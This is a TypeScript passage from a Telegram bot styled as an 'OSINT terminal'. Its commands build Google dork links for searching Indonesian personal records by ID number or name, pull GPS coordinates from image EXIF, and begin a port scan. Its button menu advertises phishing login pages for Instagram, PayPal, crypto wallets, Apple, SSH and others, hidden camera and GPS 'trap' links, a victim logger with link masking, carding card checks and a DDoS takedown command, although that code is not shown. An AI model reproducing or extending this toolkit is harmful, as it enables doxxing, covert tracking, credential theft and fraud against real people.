      const reply = `<b>🎓 SIVIL & PIN KEMDIKBUD VALIDATOR (IJAZAH)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📜 <b>NOMOR RIN/PIN VERIFIKASI:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ PEMINDAIAN DATABASE NO. IJAZAH NASIONAL:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Cek Sistem Verifikasi Ijazah Elektronik Nasional SIVIL / PDDikti</a>\n\n` +
                    `<b>[2] 📚 INVESTIGASI KEBOCORAN BERKAS (Kampus Dasar):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Audit Arsip Bukti Fisik Kelulusan di Repositori (.ac.id)</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Anti-Fraud Ijazah & Sistem Penomoran Ijazah Nasional (PIN).</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('bansos', (ctx) => {
      const args = ctx.message.text.substring(8).trim();
      if (!args) return ctx.reply("⚠️ Format: /bansos [NIK / Nama Target Penerima]");
      const q1 = encodeURIComponent(`"${args}" site:cekbansos.kemensos.go.id`);
      const q2 = encodeURIComponent(`"KPM" OR "PKH" OR "Bansos" "${args}" filetype:pdf OR filetype:xls`);
      const reply = `<b>🤝 KEMENSOS DTKS & BANSOS PROFILER</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>TARGET KPM (Keluarga Penerima Manfaat):</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ DORK INTEGRASI DATA TERPADU (DTKS):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Pemindaian Catatan Bantuan Sosial Kemensos / PBI-JK</a>\n\n` +
                    `<b>[2] 📑 BUKTI CAIR / DATA PENYALURAN REGIONAL:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Scan Dump Data Pencairan PKH / BST Tingkat Pemda/Desa</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Modul Intelijen Kesejahteraan Sosial Kemensos RI.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('pbb', (ctx) => {
      const args = ctx.message.text.substring(5).trim();
      if (!args) return ctx.reply("⚠️ Format: /pbb [Nomor Objek Pajak/NOP 18-Digit]");
      const q1 = encodeURIComponent(`"${args}" site:go.id "Pajak Bumi dan Bangunan"`);
      const q2 = encodeURIComponent(`"${args}" SPPT OR NOP filetype:pdf OR filetype:xls`);
      const reply = `<b>🏡 PAJAK PROPERTY & NJOP (PBB TRACKER)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📄 <b>NOMOR OBJEK PAJAK (NOP):</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ TRACE DATABASE BAPENDA / PAJAK DAERAH:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Pencarian SPPT PBB & Riwayat Tagihan Pajak Properti</a>\n\n` +
                    `<b>[2] 🚨 INVESTIGASI TUNGGAKAN / LELANG SITA PAJAK:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Audit Arsip Bukti Bayar / Surat Teguran Penyitaan Lahan</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Fasilitas pelacakan Aset Tidak Bergerak (Pajak Bumi & Bangunan).</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('samsat', (ctx) => {
      const args = ctx.message.text.substring(8).trim();
      if (!args) return ctx.reply("⚠️ Format: /samsat [Nomor Polisi Kendaraan]");
      const q1 = encodeURIComponent(`"${args}" site:bapenda.*.go.id OR site:samsat.*.go.id`);
      const q2 = encodeURIComponent(`"STNK" OR "PKB" "Pajak" "${args}"`);
      const reply = `<b>🏍️ E-SAMSAT & PKB VEHICLE TRACKER</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `🚘 <b>NOMOR POLISI / NOPOL:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ PEMINDAIAN REGISTRASI KENDARAAN (SAMSAT):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Pelacak Jejak Pajak Kendaraan Bermotor Wilayah Bapenda</a>\n\n` +
                    `<b>[2] 🔎 INVESTIGASI STATUS TAGIHAN & TILANG ETLE:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Scan Footprint STNK / Denda PKB di Mesin Pencari Publik</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Alat Bantu Pantau Kewajiban Pajak Transportasi Nasional.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('cekal', (ctx) => {
      const args = ctx.message.text.substring(7).trim();
      if (!args) return ctx.reply("⚠️ Format: /cekal [Nama Lengkap / Nomor Paspor]");
      const q1 = encodeURIComponent(`"${args}" site:imigrasi.go.id OR site:kemenkumham.go.id`);
      const q2 = encodeURIComponent(`"Pencegahan dan Penangkalan" OR "Cekal" "${args}"`);
      const reply = `<b>🛑 IMIGRASI INTERPOL & CEKAL MAPPING</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>SUBJEK TRAVEL BAN:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ DORK DIREKTORAT JENDERAL IMIGRASI:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Penelusuran Log Daftar Pencegahan & Penangkalan Nasional</a>\n\n` +
                    `<b>[2] 🚨 INVESTIGASI SINDIKAT / RED NOTICE:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Audit Arsip Berita Red Notice / Status Deportasi Subjek</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Intelijen Perbatasan Imigrasi dan Larangan Ke Luar Negara RI.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('pse', (ctx) => {
      const args = ctx.message.text.substring(5).trim();
      if (!args) return ctx.reply("⚠️ Format: /pse [Nama Aplikasi / PT Developer]");
      const q1 = encodeURIComponent(`"${args}" site:pse.kominfo.go.id`);
      const q2 = encodeURIComponent(`"Surat Tanda Daftar Penyelenggara Sistem Elektronik" "${args}"`);
      const reply = `<b>💻 PSE KOMINFO CYBER LEGITIMACY SCANNER</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📱 <b>SISTEM ELEKTRONIK / DOMAIN:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ REGULASI PENYELENGGARA SIBER NASIONAL:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Verifikasi Legalitas Entitas Aplikasi di Database PSE Kominfo</a>\n\n` +
                    `<b>[2] 📑 AUDIT TANDA DAFTAR (TDPSE):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Scan Riwayat Sertifikat Tanda Terdaftar Digital Asing & Lokal</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Modul Perlindungan Konsumen & Pencegahan Platform Ilegal di Indonesia.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('djki', (ctx) => {
      const args = ctx.message.text.substring(6).trim();
      if (!args) return ctx.reply("⚠️ Format: /djki [Nama Merek / Perusahaan]");
      const q1 = encodeURIComponent(`"${args}" site:pdki-indonesia.dgip.go.id OR site:dgip.go.id`);
      const q2 = encodeURIComponent(`"Berita Resmi Merek" "${args}" filetype:pdf`);
      const reply = `<b>®️ DJKI HAKI & INTELLECTUAL PROPERTY CHECKER</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `🛍️ <b>ENTITAS KEKAYAAN INTELEKTUAL:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ SCAN DATABASE PUSAT (PDKI) KEMENKUMHAM:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Pelacak Status Hak Cipta, Paten, & Pencatatan Merek Dagang</a>\n\n` +
                    `<b>[2] 📑 EKSFILTRASI JURNAL/BERITA RESMI MEREK:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Audit Arsip Penolakan/Persetujuan Hak Merek (BRM PDF)</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Alat Forensik Legalitas Brand dan Korporat Skala Nasional.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('ahu', (ctx) => {
      const args = ctx.message.text.substring(5).trim();
      if (!args) return ctx.reply("⚠️ Format: /ahu [Nama PT / Yayasan / Perseroan]");
      const q1 = encodeURIComponent(`"${args}" site:ahu.go.id`);
      const q2 = encodeURIComponent(`"Profil Perusahaan Terbuka" "${args}" filetype:pdf OR filetype:xls`);
      const reply = `<b>🏢 AHU KEMENKUMHAM CORPORATE PROFILER</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `💼 <b>ENTITAS BISNIS (PT/YAYASAN):</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ VERIFIKASI ADMINISTRASI HUKUM UMUM:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Penelusuran Validitas Perseroan, Koperasi, & Notariat Kemenkumham</a>\n\n` +
                    `<b>[2] 📑 INVESTIGASI DIREKSI & AKTA PENDIRIAN:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Scan Dump Data Susunan Pengurus & Sengketa Pemegang Saham (PDF)</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Intelijen Entitas Korporasi Nasional dan Investigasi Perusahaan Fiktif.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('simkah', (ctx) => {
      const args = ctx.message.text.substring(8).trim();
      if (!args) return ctx.reply("⚠️ Format: /simkah [Nama Suami/Istri / NIK]");
      const q1 = encodeURIComponent(`"${args}" site:simkah.kemenag.go.id OR site:kua.*.go.id`);
      const q2 = encodeURIComponent(`"Akta Nikah" OR "Buku Nikah" "${args}"`);
      const reply = `<b>💍 KEMENAG SIMKAH & MARRIAGE REGISTRY AUDIT</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>ENTITAS PASANGAN / BUKU NIKAH:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ PEMINDAIAN SISTEM MANAJEMEN KUA KEMENAG:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Penelusuran Catatan Sipil Pernikahan & Jadwal Akad KUA</a>\n\n` +
                    `<b>[2] 🚨 DEEP SEARCH KETERBUKAAN SENGKETA/KASUS:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Tracing Bukti Surat Nikah Terbuka pada Dokumen Digital (Google)</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>Forensik Sipil KUA Kementrian Agama, Pencegahan Pemalsuan Status Perkawinan.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('osint_indo', (ctx) => {
      const reply = `<b>🇮🇩 OSINT INDONESIA MODULE (ADVANCED ENTERPRISE 2.0)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚡ <b>Pusat Investigasi Intelijen Regional Nasional (29 Fitur):</b>\n\n` +
                    `1. <b>Sipil & Aparatur:</b> /nik, /kk, /nip, /bpjs\n` +
                    `2. <b>Finansial & Bisnis:</b> /npwp, /nib, /qris, /ojk\n` +
                    `3. <b>Kejahatan & Hukum:</b> /rekening, /putusan, /dpo, /cekal\n` +
                    `4. <b>Akademik & Edukasi:</b> /yudisium, /sivil\n` +
                    `5. <b>Identitas & Telekomunikasi:</b> /hlr, /nama, /kodepos, /bank_indo\n` +
                    `6. <b>Transportasi & BPN:</b> /plat, /bpkb, /sertipikat, /samsat\n` +
                    `7. <b>Pemilu & Pemerintahan:</b> /kpu, /pse, /ahu\n` +
                    `8. <b>Imigrasi & Keluarga:</b> /paspor, /simkah, /bansos\n` +
                    `9. <b>Kementerian & Lembaga:</b> /lpse, /bpom, /bea_cukai, /pbb, /djki\n` +
                    `10. <b>Geo Publik (Live API):</b> /gempa\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>Integrasi Dorking tingkat atas untuk forensik publik di Indonesia berdasarkan UU KIP Open Source.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('sosmed', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /sosmed [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>📱 SOCIAL MEDIA DASHBOARD: @${user}</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `├ 📸 <b>IG:</b> <a href="https://www.instagram.com/${user}/">Instagram</a>\n` +
                    `├ 🎵 <b>TT:</b> <a href="https://www.tiktok.com/@${user}">TikTok</a>\n` +
                    `├ 🐦 <b>TW:</b> <a href="https://twitter.com/${user}">Twitter/X</a>\n` +
                    `├ 👥 <b>FB:</b> <a href="https://www.facebook.com/${user}">Facebook</a>\n` +
                    `├ 💼 <b>LI:</b> <a href="https://www.linkedin.com/in/${user}">LinkedIn</a>\n` +
                    `├ 📦 <b>KS:</b> <a href="https://www.kaskus.co.id/profile/${user}">Kaskus</a>\n` +
                    `└ 🎥 <b>YT:</b> <a href="https://www.youtube.com/@${user}">YouTube</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>Gunakan /username untuk pengecekan otomatis 100+ situs.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    // 📸 IMAGE OSINT MODULE (Reverse Image / Data)
    // 🗂️ BUTTON REPLIES MAPPING
    const buttonMap: Record<string, string> = {
       '🔒 TRIHEXA OSINT TERMINAL 🔒': '<b>🔒 TRIHEXA OSINT TERMINAL</b>\nSistem aktif. Pilih menu pada keyboard.',
       '── 🇮🇩 OSINT INDONESIA ──': '<b>🇮🇩 PUSAT KONTROL OSINT INDONESIA</b>\nPilih layanan pencarian data dari tombol di bawah.',
       '── 🕵️ GLOBAL OSINT & TRACKING ──': '<b>🕵️ GLOBAL OSINT & TRACKING</b>\nPilih layanan pelacakan digital dari tombol di bawah.',
       '── 🛑 STEALTH TRAP LOGGER ──': '<b>🛑 STEALTH TRAP LOGGER</b>\nPilih modul eksploitasi & phishing dari tombol di bawah.',
       '── 🛠️ ADVANCED CYBER TOOLS ──': '<b>🛠️ ADVANCED CYBER TOOLS</b>\nPilih alat siber tingkat lanjut dari tombol di bawah.',
       '── 🧩 UTILITAS & MEDIA ──': '<b>🧩 UTILITAS & MEDIA</b>\nPilih alat hiburan dan utilitas dari tombol di bawah.',
       '── 💀 PRO FITUR ──': '<b>💀 VIP & PRO FITUR</b>\nAkses layanan khusus dan eksperimental.',

       '🆔 Cek NIK': '<b>🆔 CEK NIK</b>\nKetik: <code>/nik [Nomor_NIK]</code>',
       '🖨️ Cek KK': '<b>🖨️ CEK KARTU KELUARGA</b>\nKetik: <code>/kk [Nomor_KK]</code>',
       '🚗 Cek Plat Nopol': '<b>🚗 CEK PLAT KENDARAAN</b>\nKetik: <code>/plat [Nomor_Plat]</code>\nContoh: <code>/plat B1234XYZ</code>',
       '🏥 Cek BPJS': '<b>🏥 CEK BPJS</b>\nKetik: <code>/bpjs [Nomor_BPJS]</code>',
       '👨‍💼 Cek NIP/ASN': '<b>👨‍💼 CEK PEGAWAI ASN/NIP</b>\nKetik: <code>/nip [Nomor_NIP]</code>',
       '🏢 Cek NIB Bisnis': '<b>🏢 CEK NIB PERUSAHAAN</b>\nKetik: <code>/nib [Nomor_NIB]</code>',
       '🎓 Cek SIVIL Ijazah': '<b>🎓 CEK IJAZAH (SIVIL)</b>\nKetik: <code>/sivil [Nomor_Ijazah]</code>',
       '⚖️ Putusan Mahkamah': '<b>⚖️ PUTUSAN HUKUM</b>\nKetik: <code>/putusan [Nama_Kasus]</code>',
       '🏛️ Cek Pajak PBB': '<b>🏛️ CEK PAJAK PBB</b>\nKetik: <code>/pbb [NOP_Pajak]</code>',
       '🚔 Cek DPO Polri': '<b>🚔 CEK BURONAN DPO POLRI</b>\nKetik: <code>/dpo [Nama_Target]</code>',
       '🛂 Cek Paspor': '<b>🛂 CEK PASPOR</b>\nKetik: <code>/paspor [Nomor_Paspor]</code>',
       '🛑 Cekal Imigrasi': '<b>🛑 CEKAL IMIGRASI</b>\nKetik: <code>/cekal [Nomor_Identitas]</code>',
       '🗳️ Cek DPT KPU': '<b>🗳️ CEK DATA PEMILIH (KPU)</b>\nKetik: <code>/kpu [NIK]</code>',
       '📜 Cek Sertipikat BPN': '<b>📜 CEK SERTIPIKAT TANAH</b>\nKetik: <code>/sertipikat [Nomor_Sertipikat]</code>',
       '📦 Cek Bea Cukai': '<b>📦 CEK RESI BEA CUKAI PAJAK</b>\nKetik: <code>/bea_cukai [Nomor_Resi]</code>',
       '🏦 Cek OJK Hukum': '<b>🏦 CEK STATUS OJK</b>\nKetik: <code>/ojk [Nama_Pinjol/Perusahaan]</code>',
       '💼 Cek Perusahaan AHU': '<b>💼 INFO PERUSAHAAN (AHU)</b>\nKetik: <code>/ahu [Nama_PT]</code>',
       '💍 Cek Buku Nikah': '<b>💍 CEK BUKU NIKAH</b>\nKetik: <code>/simkah [Nomor_Buku]</code>',
       
       '🌐 IP Geolocation Tracker': '<b>🌐 IP TRACKER</b>\nKetik:\n• <code>/ip [Alamat_IP]</code>',
       '📡 Reverse IP Lookup': '<b>📡 REVERSE IP LOOKUP</b>\nKetik:\n• <code>/reverseip [URL/IP]</code>',
       '🔎 WHOIS Domain': '<b>🔎 WHOIS LOOKUP</b>\nKetik:\n• <code>/whois [Domain]</code>',
       '🌍 DNS Records Lookup': '<b>🌍 FULL DNS RECORDS</b>\nKetik:\n• <code>/dns [Domain]</code>',
       '🕸️ Subdomain Scanner': '<b>🕸️ SUBDOMAIN FINDER</b>\nKetik:\n• <code>/subdomain [Domain]</code>',
       '🕷️ Shodan Dorking': '<b>🕷️ SHODAN IOT SCAN</b>\nKetik:\n• <code>/shodan [Query_Aset]</code> PID Intelijen',
       '📧 Email Validator & Leak': '<b>📧 EMAIL & DATA LEAK</b>\nKetik:\n• <code>/email [Alamat]</code> - Reputasi Email\n• <code>/leak [Email]</code> - Cek DB Bocor',
       '👤 Sosmed & Username Tracker': '<b>👤 USERNAME & SOSMED OSINT</b>\nKetik:\n• <code>/username [Target]</code>\n• <code>/sosmed [Target]</code>',
       '📞 Phone Tracker (HLR)': '<b>📞 PHONE TRACKING</b>\nKetik:\n• <code>/phone_dork [Nomor]</code>\n• <code>/hlr [Nomor]</code>',
       '💻 MAC Address OSINT': '<b>💻 MAC ADDRESS LOOKUP</b>\nKetik:\n• <code>/mac [Alamat_MAC]</code>',
       '🚀 Port Scanner': '<b>🚀 PORT SCANNER</b>\nKetik:\n• <code>/port [IP/Domain]</code>',
       '🚨 CVE Exploit Lookup': '<b>🚨 CVE / RED TEAM ANALYST</b>\nKetik:\n• <code>/cve CVE-XXXX-XXXX [PAS 1928]</code>',
       
       '📸 Hack Kamera Target': '<b>📸 INJEKSI KAMERA STEALTH</b>\nBuat Link: <code>/trap_camera</code>\n<i>(Kirim link unik ke target dan sistem akan memotret diam-diam jika disetujui)</i>',
       '📍 Hack GPS Presisi Target': '<b>📍 INJEKSI LOKASI GPS (PRESISI TINGGI)</b>\nBuat Link: <code>/trap_gps</code>\n<i>(Sadap titik koordinat Live akurat target)</i>',
       '🎣 Phishing IG/Meta': '<b>🎣 LOGIN PANEL PHISHING META</b>\nBuat Link: <code>/trap_ig</code>',
       '💰 Phishing Crypto/Wallet': '<b>💰 PHISHING WALLET WEB3 / BINANCE</b>\nBuat Link: <code>/trap_binance</code>, <code>/trap_wallet</code>',
       '💳 Phishing PayPal': '<b>💳 PHISHING PAYPAL</b>\nBuat Link: <code>/trap_paypal</code>',
       '🎮 Phishing Steam': '<b>🎮 LOGIN PANEL STEAM</b>\nBuat Link: <code>/trap_steam</code>',
       '🛡️ Trap Bypass Cloudflare': '<b>🛡️ FAKE CLOUDFLARE ANTI-BOT (TRAP)</b>\nBuat Link: <code>/trap_cloudflare</code>',
       '💬 Phishing FB/Messenger': '<b>💬 PHISHING FB/MESSENGER</b>\nBuat Link: <code>/trap_facebook</code>, <code>/trap_messenger</code>',
       '💼 Phishing LinkedIn': '<b>💼 PHISHING LINKEDIN</b>\nBuat Link: <code>/trap_linkedin</code>',
       '🛒 Phishing Amazon/Toko': '<b>🛒 PHISHING AMAZON</b>\nBuat Link: <code>/trap_amazon</code>',
       '🎵 Phishing Spotify/Netflix': '<b>🎵 PHISHING SPOTIFY/NETFLIX</b>\nBuat Link: <code>/trap_spotify</code>, <code>/trap_netflix</code>',
       '🍎 Phishing AppleID': '<b>🍎 PHISHING APPLE ID</b>\nBuat Link: <code>/trap_apple</code>',
       '📁 Phishing GDrive/Dropbox': '<b>📁 PHISHING GDRIVE/DROPBOX</b>\nBuat Link: <code>/trap_gdrive</code>, <code>/trap_dropbox</code>',
       '🐧 Phishing Linux/SSH': '<b>🐧 PHISHING SSH/LINUX PANEL</b>\nBuat Link: <code>/trap_ssh</code>',
       '📊 Lihat Log Korban (Logger)': '<b>📊 KONTROL PANEL STEALTH LOGGER</b>\nCek daftar IP target & Korban: <code>/logger</code>',
       '⚙️ Set Custom Domain Tracker': '<b>⚙️ ATUR DOMAIN UNTUK TRAP LOGGER</b>\nGunakan masking agar link tidak mencurigakan:\n<code>/sethost [Pilihan]</code>',
       
       '🔐 Hash Generator (MD5/SHA)': '<b>🔐 ENKRIPSI & HASH GENERATOR</b>\nKetik:\n• <code>/hash [TEKS]</code> (Termasuk MD5/SHA dll)\n• <code>/sha256 [TEKS]</code>',
       '🔓 Base64 Encode/Decode': '<b>🔓 BASE64 ENCODER/DECODER</b>\nKetik:\n• <code>/b64enc [Teks]</code>\n• <code>/b64dec [String_Base64]</code>',
       '💳 Cek Info BIN Card': '<b>💳 CEK INFO BIN (BANKING)</b>\nKetik:\n• <code>/bininfo [6_DIGIT_DEPAN_KARTU]</code> (VISA, MC, JCB, dll)',
       '💳 Validasi CC (Carding)': '<b>💳 CHECKER CREDIT CARD</b>\nKetik:\n• <code>/cc_check [Nomor_CC]</code> (Deteksi LUN/Fraud)',
       '🧪 XSS Scanner': '<b>🧪 XSS VULN SCANNER</b>\nKetik:\n• <code>/xss [URL_Website]</code>',
       '🦠 VirusTotal Web/File Scan': '<b>🦠 VIRUSTOTAL MALWARE SCAN</b>\nKetik:\n• <code>/scan [URL]</code>\nAtau gunakan untuk file (saat ada dokumen)',
       
       '🎵 Download Lagu/Audio': '<b>🎵 MEDIA AUDIO DOWNLOADER</b>\nKetik:\n• <code>/lagu [Judul]</code>\n• <code>/play [Judul]</code>',
       '🎥 Download Video (IG/TikTok)': '<b>🎥 MEDIA VIDEO DOWNLOADER</b>\nKetik:\n• <code>/tiktok [URL]</code>\n• <code>/ig [URL]</code>',
       '⏰ Sistem Alarm Pengingat': '<b>⏰ ALARM BOT</b>\nKetik:\n• <code>/alarm [Format Waktu] [Pesan]</code>\nContoh: <code>/alarm 30m Angkat Telpon</code>',
       '🌤️ Info Cuaca Area': '<b>🌤️ INFO CUACA SATELIT</b>\nKetik:\n• <code>/weather [Nama_Kota]</code>\n• <code>/gempa</code>',
       '📈 Info Harga Crypto (Live)': '<b>📈 LIVE MARKET CRYPTO</b>\nKetik:\n• <code>/crypto_price [Simbol]</code> (Contoh: BTC, ETH, SOL)',
       '📲 Koneksi Bot WhatsApp': '<b>📲 WHATSAPP BOT BRIDGE</b>\nKetik: <code>/wa_connect</code> <i>(Hanya Admin yang dapat memindai Auth QR)</i>',
       
       '💀 SANTO PETRUS (TAKEDOWN)': '<b>💀 SANTO PETRUS (DDoS / TAKEDOWN)</b>\nSistem Takedown intelijen dan DoS skala tinggi terkunci akses Admin.\nKetik: <code>/santopetrus [Target]</code>\n<i>(Membutuhkan otorisasi sistem tertinggi)</i>',
       'ℹ️ Informasi Bot & Bantuan': '<b>ℹ️ PUSAT BANTUAN</b>\nGunakan / (Garis Miring) di kotak chat Anda untuk melihat seluruh command terintegrasi.'
    };

    bot.on('text', async (ctx, next) => {
      // @ts-ignore
      const text = ctx.message.text;
      if (buttonMap[text]) {
         return ctx.reply(buttonMap[text], { parse_mode: 'HTML' });
      }

      // Fallback for old keyboard buttons or UI headers
      if (typeof text === 'string' && (text.includes('──') || text.includes('OSINT') || text.includes('Cek Data') || text.includes('Tracker') || text.includes('Phishing') || text.includes('Bantuan') || text.includes('Kamera'))) {
         return ctx.reply("🔄 <b>Sistem Diperbarui</b>\n\nMemuat ulang Terminal UI ke versi terbaru... Silakan pilih menu dari UI baru di bawah ini.", { parse_mode: 'HTML', ...mainReplyKeyboard });
      }

      return next();
    });

    bot.on('photo', async (ctx) => {
      ctx.reply("📸 <b>IMAGE OSINT MODULE ACTIVATED</b>\nSedang menganalisa foto...", {parse_mode: 'HTML'}).then((msg) => {
         setTimeout(() => {
            const txt = `<b>🔍 REVERSE IMAGE SEARCH LINKS</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `Klik link berikut untuk mencari wajah/foto di database publik:\n\n` +
                        `🌐 <a href="https://lens.google.com/uploadbyurl?url=">Google Lens (Butuh URL)</a>\n` +
                        `🔎 <a href="https://yandex.com/images/search?rpt=imageview&url=">Yandex Deep Search</a>\n` +
                        `👤 <a href="https://pimeyes.com/">PimEyes (Face Search)</a>\n` +
                        `👤 <a href="https://facecheck.id/">FaceCheck.id</a>\n\n` +
                        `⚠️ <i>Catatan: Telegram menghapus EXIF metadata GPS pada foto terkirim untuk keamanan. Kirim sebagai File jika butuh EXIF extraction.</i>`;
            ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, txt, { parse_mode: 'HTML', link_preview_options: {is_disabled: true} });
         }, 1500);
      });
    });

    bot.on('document', async (ctx) => {
      if (ctx.message.document.mime_type?.startsWith('image/')) {
         try {
             ctx.reply("🔍 <b>Memproses Gambar untuk Analisis EXIF...</b>", {parse_mode: 'HTML'});
             const fileId = ctx.message.document.file_id;
             const link = await ctx.telegram.getFileLink(fileId);
             const response = await axios.get(link.href, { responseType: 'arraybuffer' });
             
             // Dynamic import as it's ESM usually or we can require. Wait: exifr might be loaded via import
             const exifr = await import('exifr');
             const exifData = await exifr.default.parse(Buffer.from(response.data), { xmp: true, tiff: true, exif: true, gps: true });
             
             if (!exifData) {
                 ctx.reply("📂 <b>IMAGE FILE DETECTED</b>\n<i>EXIF Analyzer</i>\n\n- Tidak ada metadata EXIF yang ditemukan (Mungkin dilucuti oleh platform/pengirim).", {parse_mode: 'HTML'});
                 return;
             }
             
             let res = `📂 <b>IMAGE EXIF DATA DETECTED</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
             if (exifData.Make || exifData.Model) res += `📷 <b>Kamera:</b> ${exifData.Make || ''} ${exifData.Model || ''}\n`;
             if (exifData.DateTimeOriginal) res += `📅 <b>Waktu Dibuat:</b> ${exifData.DateTimeOriginal}\n`;
             if (exifData.Software) res += `⚙️ <b>Software:</b> ${exifData.Software}\n`;
             if (exifData.latitude && exifData.longitude) {
                 res += `📍 <b>GPS (Lokasi Tepat):</b>\nGoogle Maps: <code>https://maps.google.com/?q=${exifData.latitude},${exifData.longitude}</code>\n`;
             } else {
                 res += `📍 <b>GPS:</b> Tidak ditemukan kordinat lokasi.\n`;
             }
             res += `━━━━━━━━━━━━━━━━━━━━`;
             ctx.reply(res, {parse_mode: 'HTML'});
         } catch (e: any) {
             ctx.reply("❌ Gagal membaca EXIF dari gambar.");
         }
      }
    });

    bot.command('scan', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /scan [IP/Domain]");
      const target = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      const scanMsg = await ctx.reply(`🔍 <b>DEEP_SCAN_INITIATED:</b> <code>${target}</code>\n<i>Menjalankan modul Multi-Layer Recon (OSINT, NMAP-lite, Banner Grabbing)...</i>`, { parse_mode: 'HTML' });
      
      try {
        // [1] IP-API Fetch
        const ipRes = await fetch(`http://ip-api.com/json/${target}?fields=status,message,country,city,isp,org,query`);
        const ipData = await ipRes.json();
        
        let ipInfo = "N/A";
        let targetIp = target;
        if (ipData.status === 'success') {
           targetIp = ipData.query;
           ipInfo = `IP: ${ipData.query}\nNegara: ${ipData.country}\nKota: ${ipData.city}\nISP: ${ipData.isp}`;
        }
        
        // [2] WHOIS Fetch
        const whoisRes = await fetch(`https://networkcalc.com/api/dns/whois/${target}`);
        const whoisRaw = await whoisRes.json().catch(() => null);
        let whoisInfo = "No Data";
        if (whoisRaw && whoisRaw.status === 'OK' && whoisRaw.whois) {
            whoisInfo = `Registrar: ${whoisRaw.whois.registrar || '-'}\nCreated: ${whoisRaw.whois.creation_date || '-'}\nExpires: ${whoisRaw.whois.expiration_date || '-'}`;
        }
        
        // [3] REAL INTENSIVE PORT SCAN 
        const importantPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443, 27017];
        let openPorts: number[] = [];
        
        const checkPort = (port: number) => {
          return new Promise<void>((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
